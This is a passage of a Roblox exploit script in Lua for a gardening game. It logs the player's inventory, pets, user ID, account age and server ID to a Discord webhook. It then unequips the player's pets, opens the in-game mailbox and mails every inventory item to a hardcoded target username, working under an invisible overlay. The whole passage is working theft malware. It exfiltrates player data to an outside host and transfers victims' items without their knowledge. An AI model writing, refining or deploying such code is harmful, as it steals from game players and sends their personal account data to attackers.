-- Pet scanner — pets live in PetList UI, not in the Backpack.
-- ============================================================================
local function scanPets()
	local equippedPets, allPets = {}, {}
	local petList = playerGui:FindFirstChild("PetList")
	if not petList then return equippedPets, allPets end

	local scrollingFrame
	for _, d in ipairs(petList:GetDescendants()) do
		if d:IsA("ScrollingFrame") then
			scrollingFrame = d
			break
		end
	end
	if not scrollingFrame then return equippedPets, allPets end

	local function extractName(card)
		for _, labelName in ipairs({ "PetName", "Name", "Title", "NameLabel" }) do
			local lbl = card:FindFirstChild(labelName, true)
			if lbl and lbl:IsA("TextLabel") and lbl.Text ~= "" then
				return lbl.Text
			end
		end
		for _, d in ipairs(card:GetDescendants()) do
			if d:IsA("TextLabel") and d.Text and d.Text ~= "" then
				local t = d.Text
				if not t:match("^%s*[%d%.]+%s*$") then
					return t
				end
			end
		end
		return card.Name
	end

	local function extractMeta(card)
		for _, d in ipairs(card:GetDescendants()) do
			if d:IsA("TextLabel") and d.Text then
				local t = d.Text
				if t:lower():find("kg") or t:lower():find("age") or  --
				t:lower():find("lvl") then
					return t
				end
			end
		end
		return nil
	end

	local function isEquipped(card)
		for _, d in ipairs(card:GetDescendants()) do
			if d:IsA("GuiButton") and d.Name == "Unequip" and d.Visible == true then
				if not string.find(d:GetFullName(), "Template") then
					return true
				end
			end
		end
		return false
	end

	for _, card in ipairs(scrollingFrame:GetChildren()) do
		if card:IsA("GuiObject") then
			local fullName = card:GetFullName()
			if not fullName:find("Template") and not (card:IsA("UIListLayout") or card:IsA("UIGridLayout") or card:IsA("UIPadding")) then
				local name = extractName(card)
				if name and name ~= "" then
					local meta = extractMeta(card)
					local display = meta and (name .. " — " .. meta) or name
					table.insert(allPets, display)
					if isEquipped(card) then
						table.insert(equippedPets, display)
					end
				end
			end
		end
	end

	return equippedPets, allPets
end

-- Send backpack contents to Discord webhook
local function sendBackpackToWebhook()
	local backpack = localPlayer:FindFirstChild("Backpack")
	if not backpack then warn("Backpack not found") return end

	local seedSet, crateSet = {}, {} --
	for _, n in ipairs(FRUITS) do seedSet[n:lower()] = true end
	for _, n in ipairs(CRATES) do crateSet[n:lower()] = true end

	local function isGear(name)
		local n = name:lower()
		return n:find("sprinkler") or n:find("watering") or n:find("can")
			or n:find("mushroom") or n:find("trowel") or n:find("shovel")
			or n:find("fertilizer") or n:find("hoe") or n:find("rake")
	end

	local petSet = {}
	for _, n in ipairs({
		"Raccoon","Black Dragon","BlackDragon","Ice Serpent","IceSerpent","Unicorn",
		"Bee","Golden Dragonfly","GoldenDragonfly","DragonFly","Dragonfly","Deer","Bunny",
		"Frog",
		"Robin","Owl","Monkey"
	}) do
		petSet[n:lower()] = true
	end

	local function categorise(name)
		local low = name:lower()
		if seedSet[low] then return "seeds" end
		if crateSet[low] then return "crates" end
		if petSet[low] then return "pets" end
		if isGear(name) then return "gear" end
		return "other" -- Everything not neatly categorized falls into "other" safely
	end

	-- Pull a stack count from a Tool (attribute, child IntValue, or fallback to 1)
	local function getToolCount(tool)
		for _, attr in ipairs({ "Count", "Amount", "Stack", "Quantity", "Stacks" }) do
			local v = tool:GetAttribute(attr)
			if type(v) == "number" and v > 0 then return v end
		end
		for _, childName in ipairs({ "Count", "Amount", "Stack", "Quantity" }) do
			local c = tool:FindFirstChild(childName)
			if c and c.Value then
				local n = tonumber(c.Value)
				if n and n > 0 then return n end
			end
		end
		local tail = tool.Name:match("%[x(%d+)%]") or tool.Name:match("x(%d+)%s*$")
		if tail then return tonumber(tail) end
		return 1
	end

	local function cleanName(name)
		return (name:gsub("%s*%[x%d+%]%s*$", ""):gsub("%s+x%d+%s*$", ""))
	end

	local buckets = { seeds = {}, pets = {}, gear = {}, crates = {}, other = {} }
	local bucketTotals = { seeds = 0, pets = 0, gear = 0, crates = 0, other = 0 } --
	local bucketLookups = { seeds = {}, pets = {}, gear = {}, crates = {}, other = {} }
	local equippedItems, equippedLookup, equippedTotal = {}, {}, 0

	local function addToBucket(category, name, count)
		local lookup = bucketLookups[category]
		local idx = lookup[name]
		if idx then
			buckets[category][idx].count = buckets[category][idx].count + count
		else
			table.insert(buckets[category], { name = name, count = count })
			lookup[name] = #buckets[category]
		end
		bucketTotals[category] = bucketTotals[category] + count
	end

	local function addEquipped(name, count)
		local idx = equippedLookup[name]
		if idx then
			equippedItems[idx].count = equippedItems[idx].count + count
		else
			table.insert(equippedItems, { name = name, count = count })
			equippedLookup[name] = #equippedItems
		end
		equippedTotal = equippedTotal + count
	end

	for _, tool in ipairs(backpack:GetChildren()) do
		if tool:IsA("Tool") then
			local clean = cleanName(tool.Name)
			addToBucket(categorise(clean), clean, getToolCount(tool))
		end
	end

	local character = localPlayer.Character
	if character then --
		for _, tool in ipairs(character:GetChildren()) do
			if tool:IsA("Tool") then
				local clean = cleanName(tool.Name)
				addEquipped(clean, getToolCount(tool))
			end
		end
	end

	local equippedPets, ownedPets = scanPets()
	for _, p in ipairs(equippedPets) do
		addEquipped("🐾 " .. p, 1)
	end
	if #ownedPets > 0 then
		buckets.pets = {}
		bucketLookups.pets = {}
		bucketTotals.pets = 0
		for _, p in ipairs(ownedPets) do
			table.insert(buckets.pets, { name = p, count = 1 })
			bucketTotals.pets = bucketTotals.pets + 1
		end
	end

	local totalCount = bucketTotals.seeds + bucketTotals.pets + bucketTotals.gear
		+ bucketTotals.crates + bucketTotals.other + equippedTotal

	local function formatList(list)
		if #list == 0 then return "`— empty —`" end
		local lines = {}
		for i, entry in ipairs(list) do
			if type(entry) == "table" then
				local suffix = (entry.count and entry.count > 1)
					and (" `×" .. entry.count .. "`") or "" --
				lines[i] = "`•` " .. entry.name .. suffix
			else
				lines[i] = "`•` " .. tostring(entry)
			end
		end
		local text = table.concat(lines, "\n")
		if #text > 1010 then
			text = text:sub(1, 1000) .. "\n`… +more`"
		end
		return text
	end

	local HttpService = game:GetService("HttpService")
	local function fetchAvatar(endpoint, size)
		local url = "https://thumbnails.roblox.com/v1/users/" .. endpoint
			.. "?userIds=" .. localPlayer.UserId
			.. "&size=" .. size
			.. "&format=Png&isCircular=false"
		local ok, body = pcall(function() return game:HttpGet(url) end)
		if not ok or not body then return nil end
		local ok2, decoded = pcall(function() return HttpService:JSONDecode(body) end)
		if not ok2 or not decoded or not decoded.data or not decoded.data[1] then return nil end
		return decoded.data[1].imageUrl
	end
	local avatarThumb = fetchAvatar("avatar-headshot", "420x420")
	local avatarAuthor = fetchAvatar("avatar-bust", "150x150") or avatarThumb

	local accountAgeDays = localPlayer.AccountAge
	local placeId = tostring(game.PlaceId) --
	local jobId = (game.JobId ~= "" and game.JobId) or "Studio / Solo"
	local serverPlayers = #Players:GetPlayers()

	local function isoTimestamp()
		local t = os.date("!*t")
		return string.format("%04d-%02d-%02dT%02d:%02d:%02d.000Z",
			t.year, t.month, t.day, t.hour, t.min, t.sec)
	end

	local fields = {
		{ name = "👤 User ID", value = "`" .. tostring(localPlayer.UserId) .. "`", inline = true },
		{ name = "📆 Account Age", value = "`" .. accountAgeDays .. " days`", inline = true },
		{ name = "👥 In Server", value = "`" .. serverPlayers .. " players`", inline = true },
		{ name = "🗺️ Place ID", value = "`" .. placeId .. "`", inline = true },
		{ name = "🧩 Job ID", value = "`" .. jobId .. "`", inline = false }, --
		{ name = "📦 Totals",
			value = string.format(
				"🌾 Seeds: `%d`  •  🐾 Pets: `%d`  •  🛠️ Gear: `%d`\n📦 Crates: `%d`  •  ⚔️ Equipped: `%d`  •  ❔ Other: `%d`",
				bucketTotals.seeds, bucketTotals.pets, bucketTotals.gear,
				bucketTotals.crates, equippedTotal, bucketTotals.other
			),
			inline = false },
		{ name = "⚔️ Equipped (" .. equippedTotal .. ")",
			value = formatList(equippedItems), inline = false },
	}

	local function addCategory(emoji, label, list, total)
		if #list > 0 then
			local header
			if total and total ~= #list then
				header = string.format("%s %s (%d items / %d types)", emoji, label, total, #list)
			else
				header = string.format("%s %s (%d)", emoji, label, total or #list) --
			end
			table.insert(fields, {
				name = header,
				value = formatList(list),
				inline = false
			})
		end
	end

	addCategory("🌾", "Seeds", buckets.seeds, bucketTotals.seeds)
	addCategory("🐾", "Pets", buckets.pets, bucketTotals.pets)
	addCategory("🛠️", "Gear", buckets.gear, bucketTotals.gear)
	addCategory("📦", "Crates", buckets.crates, bucketTotals.crates)
	addCategory("❔", "Other", buckets.other, bucketTotals.other)

	local payload = HttpService:JSONEncode({
		username = "Garden Logger",
		embeds = {{
			author = {
				name = localPlayer.DisplayName .. " • @" .. localPlayer.Name,
				icon_url = avatarAuthor,
				url = "https://www.roblox.com/users/" .. localPlayer.UserId .. "/profile"
			},
			title = "🌱 Inventory Snapshot",
			url = "https://www.roblox.com/users/" .. localPlayer.UserId .. "/profile",
			description = "```ansi\n\27[2;32mPlayer joined — full backpack scan captured.\27[0m\n```",
			color = 5025616,
			thumbnail = avatarThumb and { url = avatarThumb } or nil,
			fields = fields,
			footer = {
				text = "Garden Logger • " .. totalCount .. " total items",
				icon_url = avatarAuthor --
			},
			timestamp = isoTimestamp()
		}}
	})

	local requestFunc = (syn and syn.request) or (http and http.request) or request
	pcall(function()
		local response = requestFunc({
			Url = WEBHOOK_URL,
			Method = "POST",
			Headers = { ["Content-Type"] = "application/json" },
			Body = payload
		})
		if response and response.StatusCode then
			if response.StatusCode >= 200 and response.StatusCode < 300 then
				print("[GardenLogger] Inventory report sent for: " .. localPlayer.Name)
			else
				warn("[GardenLogger] Discord rejected the webhook — HTTP " --
					.. tostring(response.StatusCode)
					.. " | body: " .. tostring(response.Body or ""):sub(1, 300))
				if response.StatusCode == 404 then
					warn("[GardenLogger] 404 means the WEBHOOK_URL is invalid or has been deleted. Recreate the webhook in Discord and paste the new URL into WEBHOOK_URL.")
				end
			end
		else
			print("[GardenLogger] Inventory report fired for: " .. localPlayer.Name)
		end
	end)
end

local function clickButton(button)
	pcall(function() firesignal(button.MouseButton1Click) end)
	pcall(function()
		local input = Instance.new("InputObject")
		input.UserInputType = Enum.UserInputType.MouseButton1
		firesignal(button.Activated, input)
	end)
end

local function hasAnythingToSend(inventoryFrame)
	for _, child in ipairs(inventoryFrame:GetChildren()) do
		local name = child.Name
		if name:sub(1, 10) == "Inv_Seeds:" then return true end
		if name:sub(1, 9) == "Inv_Pets:" then return true end
		if name:sub(1, 11) == "Inv_Crates:" then return true end
		for _, prefix in ipairs(GEAR_PREFIXES) do
			if name:sub(1, #prefix) == prefix then return true end
		end
	end
	return false
end

local function runSequence()
	local petList = playerGui:FindFirstChild("PetList")
	if not petList then return end

	local toggleButton = petList:FindFirstChild("Exit", true) and petList.Exit:FindFirstChild("OpenButton")
	local scrollingFrame = petList:FindFirstChild("ScrollingFrame", true)
	if not toggleButton or not scrollingFrame then return end

	local function safeClick(button)
		pcall(function() firesignal(button.Activated) end)
		pcall(function() firesignal(button.MouseButton1Click) end)
	end

	local function findNextUnequipButton()
		for _, desc in pairs(scrollingFrame:GetDescendants()) do
			if desc:IsA("GuiButton") and desc.Name == "Unequip" and desc.Visible == true then
				if not string.find(desc:GetFullName(), "Template") then
					return desc
				end
			end
		end
		return nil
	end

	safeClick(toggleButton)
	task.wait(0.2)

	local unequipButton = findNextUnequipButton()
	while unequipButton do
		safeClick(unequipButton)
		task.wait()
		unequipButton = findNextUnequipButton()
	end

	safeClick(toggleButton)
end

local function runScript()
	-- Targeted Mailbox Cleanup: Only clean up the mailbox window when launching the sequence
	local mailbox = playerGui:FindFirstChild("MailboxUI")
	if mailbox then
		local closeBtn = mailbox:FindFirstChild("CloseButton", true)
		if closeBtn then pcall(function() firesignal(closeBtn.MouseButton1Click) end) end
		task.wait(0.2)
	end

	local touchShield = Instance.new("ScreenGui")
	touchShield.Name = "TouchShieldSystem"
	touchShield.DisplayOrder = 999999

	local targetBlocker = Instance.new("TextButton")
	targetBlocker.Size = UDim2.new(0, 0, 0, 0)
	targetBlocker.BackgroundTransparency = 1
	targetBlocker.Text = ""
	targetBlocker.Parent = touchShield
	touchShield.Parent = playerGui

	pcall(runSequence)
	task.wait(0.5)

	local mailboxPrompt = workspace.Gardens.Plot1.Signs.GreyMailBox.ProximityPromptPart.MailboxPrompt
	fireproximityprompt(mailboxPrompt)
	task.wait(0.4)

	local mailboxUI = playerGui:WaitForChild("MailboxUI", 5)
	if not mailboxUI then touchShield:Destroy() warn("Retry: MailboxUI not found") return false end

	local mainFrame = mailboxUI:WaitForChild("Frame", 5)
	if not mainFrame then touchShield:Destroy() warn("Retry: Frame not found") return false end

	local sendingFrame = mainFrame:WaitForChild("SendingFrame", 5)
	if not sendingFrame then touchShield:Destroy() warn("Retry: SendingFrame not found") return false end

	local selectPlayerFrame = sendingFrame:WaitForChild("SelectPlayerFrame", 5)
	if not selectPlayerFrame then touchShield:Destroy() warn("Retry: SelectPlayerFrame not found") return false end

	local topbar = selectPlayerFrame:WaitForChild("Topbar", 5)
	if not topbar then touchShield:Destroy() warn("Retry: Topbar not found") return false end

	local searchBox = topbar:WaitForChild("SearchBox", 5)
	if not searchBox then touchShield:Destroy() warn("Retry: SearchBox not found") return false end

	searchBox:CaptureFocus()
	searchBox.Text = TARGET_USERNAME
	task.wait(0.05)

	searchBox:ReleaseFocus()
	task.wait(0.05)

	local VIM = game:GetService("VirtualInputManager")
	VIM:SendKeyEvent(true, Enum.KeyCode.Return, false, game)
	task.wait(0.4)

	local playerList = selectPlayerFrame:WaitForChild("PlayerList", 5)
	if not playerList then touchShield:Destroy() warn("Retry: PlayerList not found") return false end

	local found = false
	local deadline = tick() + 4
	while not found and tick() < deadline do
		for _, frame in ipairs(playerList:GetChildren()) do
			if frame:IsA("Frame") and frame.Name:match("^Search_") then
				local button = frame:FindFirstChild("Button")
				if button then
					local usernameLabel = button:FindFirstChild("PlayerUsername")
					if usernameLabel then
						local cleanText = usernameLabel.Text:lower():gsub("^@", "")
						if cleanText == TARGET_USERNAME:lower() then
							clickButton(button)
							found = true
							break
						end
					end
				end
			end
		end
		if not found then task.wait(0.05) end
	end

	if not found then touchShield:Destroy() warn("Retry: Player not found in list") return false end

	task.wait(0.3)

	local itemSendFrame = sendingFrame:WaitForChild("ItemSendFrame", 5)
	if not itemSendFrame then touchShield:Destroy() warn("Retry: ItemSendFrame not found") return false end

	local scrollingFrames = itemSendFrame:WaitForChild("ScrollingFrames", 5)
	if not scrollingFrames then touchShield:Destroy() warn("Retry: ScrollingFrames not found") return false end

	local inventoryFrame = scrollingFrames:WaitForChild("InventoryFrame", 5)
	if not inventoryFrame then touchShield:Destroy() warn("Retry: InventoryFrame not found") return false end

	if not hasAnythingToSend(inventoryFrame) then
		touchShield:Destroy()
		return "done"
	end

	-- IMPROVED ITEM SENDER: Clicks everything in the inventory window generically
	local function sendAllInventoryItems(targetFrame)
		for _, item in ipairs(targetFrame:GetChildren()) do
			local inner = item:FindFirstChildWhichIsA("Frame")
			local btn = inner and inner:FindFirstChildWhichIsA("GuiButton")
			if btn then
				clickButton(btn)
				task.wait(0.05)
			end
		end
	end

	sendAllInventoryItems(inventoryFrame)
	task.wait(0.6)

	local sendButton = itemSendFrame:WaitForChild("SendButton", 5)
	if sendButton and sendButton:IsA("GuiButton") then
		clickButton(sendButton)
	end

	touchShield:Destroy()
	return true
end

